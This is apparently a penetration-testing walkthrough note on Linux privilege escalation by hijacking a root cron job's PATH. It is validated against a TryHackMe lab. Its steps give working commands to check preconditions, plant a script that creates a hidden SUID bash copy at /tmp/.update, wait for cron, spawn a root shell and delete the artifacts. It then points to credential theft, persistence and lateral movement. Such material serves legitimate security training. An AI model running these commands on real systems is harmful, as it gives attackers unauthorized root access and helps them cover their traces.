
⚠️ **Hard preconditions — verified in Step 1.**

- **A root cron entry invokes `<cmd>` as a bare command name containing no slash** (e.g. `overwrite.sh`). Any command word with a slash — absolute (`/usr/local/bin/overwrite.sh`) or relative (`./overwrite.sh`, `sub/overwrite.sh`) — bypasses PATH search and is not PATH-hijackable; wrong walkthrough.
- **A directory `<dir>` in cron's PATH is writable** by the current user.
- **`<dir>` precedes `<cmd>`'s current resolution directory in cron's PATH** — or `<cmd>` resolves nowhere. If `<cmd>` already resolves from a directory earlier in cron's PATH than `<dir>`, the plant is never reached and the technique fails. This is the distinguishing precondition, verified in Step 1.
- **Cron will execute within the operator's time budget.** Schedule must be tight enough for live exploitation — typically `* * * * *` or minutes-scale. Daily/weekly/monthly schedules require persistence-window planning.
- **`<cron_user>` is the UID-0 account verified in Step 1.** Commands assume root; if `<cron_user>` is non-root, Step 4 yields that user's privileges (lateral outcome only, not root).
- **Non-destructive.** Step 2 creates a new file at `<dir>/<cmd>`; it does not modify the legitimate `<cmd>` (which lives elsewhere in PATH, if anywhere). No backup step required.

---

## Step 1 — Preflight

⚠️ `<cmd>` is the value from `RELATIVE_CMD[root]: <cmd>` and `<dir>` is the value from `WRITABLE_PATH_DIR: <dir>` in [[Linux Privilege Escalation Checksheet]] Step 4. If unknown, return there first.
##### Confirm the cron entry invokes `<cmd>` as a bare name (no slash), and identify `<cron_user>` and `<cron_interval>`: 

`grep -h "<cmd>" /etc/crontab /etc/cron.d/* 2>/dev/null` 

- If the command field is `<cmd>` with no slash (e.g. `overwrite.sh`) → PATH search applies and is hijackable. **Note** the field directly before `<cmd>` as `<cron_user>`, and everything preceding `<cron_user>` as `<cron_interval>` — the five time fields, or a single `@`-string (`@hourly`, `@reboot`, …). Proceed.
- Command field contains a slash — absolute (`/usr/local/bin/<cmd>`) or relative (`./<cmd>`, `sub/<cmd>`) → no PATH search; not PATH-hijackable. Wrong walkthrough; return to Checksheet.
##### Confirm writability of `<dir>` — the writable directory in cron's PATH:

`test -w <dir> && echo "WRITABLE" || echo "NOT WRITABLE"`

- `WRITABLE` → proceed
- `NOT WRITABLE` → walkthrough doesn't apply; return to Checksheet

##### Establish cron's PATH:

`grep -E '^[[:space:]]*PATH=' /etc/crontab`

- Line returned → note the value after `PATH=` as `<cron_path>` (colon-separated, left-to-right priority).
- No output → cron uses its built-in default `PATH=/usr/bin:/bin`. Note `<cron_path>` as `/usr/bin:/bin`.

##### Confirm `<dir>` is in `<cron_path>` and precedes any current resolution of `<cmd>` (precedence check):

`p="<cron_path>"; IFS=:; r=""; for d in $p; do [ "$d" = "<dir>" ] && { r=WIN; break; }; [ -n "$(find "$d/<cmd>" -perm /111 2>/dev/null)" ] && { r="LOSE:$d"; break; }; done; echo "PRECEDENCE: ${r:-DIR_NOT_IN_PATH}"; unset IFS`

Walks `<cron_path>` left-to-right and stops at whichever comes first: `<dir>`, or a directory holding an executable `<cmd>`.

- `WIN` → `<dir>` is reached before any executable `<cmd>`; the plant resolves first → proceed.
- `LOSE:<resolve_dir>` → cron resolves an executable `<cmd>` at `<resolve_dir>` before reaching `<dir>`; the plant never fires. Try the next `WRITABLE_PATH_DIR` (`<dir>`) marker; if none precedes `<resolve_dir>`, Cron PATH is not applicable on this box.
- `DIR_NOT_IN_PATH` → `<dir>` is not in `<cron_path>`; the plant is never searched. (`<dir>` is a `WRITABLE_PATH_DIR` from Checksheet Step 3, so expect this only on a PATH mismatch — **recheck** `<cron_path>` first. Still fails, try the next `WRITABLE_PATH_DIR` (`<dir>`) marker; if none, Cron PATH not applicable).
##### Confirm UID 0 for `<cron_user>`:

`awk -F: -v u="<cron_user>" '$1 == u && $3 == 0' /etc/passwd`

- Line returned → `<cron_user>` is UID 0; full root achieved at Step 4.
- No output → `<cron_user>` is non-root; Step 4 lands in that user's context (lateral-only outcome).

---

## Step 2 — Plant the malicious script

Write the SUID bash payload to `<dir>/<cmd>` and make it executable:

`printf '#!/bin/bash\ncp /bin/bash /tmp/.update && chmod +s /tmp/.update\n' > <dir>/<cmd> && chmod +x <dir>/<cmd> && echo "PLANTED" || echo "PLANT FAILED"`

- `PLANTED` → proceed.
- `PLANT FAILED` → write or chmod failed despite Step 1's writability check. Re-verify `<dir>` and free space.

Verify contents:

`cat <dir>/<cmd>`

- Output is the two-line script above → proceed to Step 3.
- Output differs → redirection mistargeted. Re-check command.

---

## Step 3 — Wait for cron execution

Cron's resolution is 1 minute. Earliest execution: at the next minute boundary matching `<cron_interval>`.

For `* * * * *` wait up to 60 seconds. For `*/5 * * * *` wait up to 5 minutes. Scale accordingly.

Verify:

`ls -la /tmp/.update`

- Output shows owner `root` AND mode contains `s` (e.g. `-rwsr-sr-x`) → payload executed by cron as root. Proceed to Step 4.
- File doesn't exist → cron hasn't run yet (wait longer), cron daemon not running, or `<cmd>` is still resolving to the legitimate binary (re-verify Step 1 precedence check).
- File exists but owner is not root → `<cron_user>` is not root despite Step 1's check. Re-verify Step 1.

---

## Step 4 — Elevate

`/tmp/.update -p`

`id`

- Output contains `euid=0(root)` → root achieved. Effective UID is 0; real UID remaining as the original user is expected for SUID bash with `-p`. Proceed to Step 5.
- `euid` is not 0 → `<cron_user>` was non-root (lateral outcome) or SUID bit didn't take effect (re-check Step 3's ls output).

---

## Step 5 — Cleanup

All commands below run from the root shell acquired in Step 4.

##### Remove the planted script:

⚠️ `clear;` is included in the command below as it fires immediately on Enter, wiping any line-wrap display corruption before output prints.

`clear; rm -f <dir>/<cmd> && echo "PLANT REMOVED" || echo "REMOVE FAILED"`

- `PLANT REMOVED` → the legitimate `<cmd>` (if any) resolves normally again on the next cron run. Proceed.
- `REMOVE FAILED` → file already gone or path mistyped. Verify with `ls -la <dir>/<cmd>`.

##### Remove SUID artifact:

`rm /tmp/.update`

⚠️ The cron job continues running on its schedule. SUID exec doesn't generate an auth.log entry (kernel-level EUID change, not authentication). Cron logs capture each script run via `grep CRON /var/log/syslog` (Debian/Ubuntu) or `/var/log/cron` (RHEL/CentOS); log cleanup is out of scope.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

## Validation

THM:Linux PrivEsc:Task 9 Cron Jobs - PATH Environment Variable

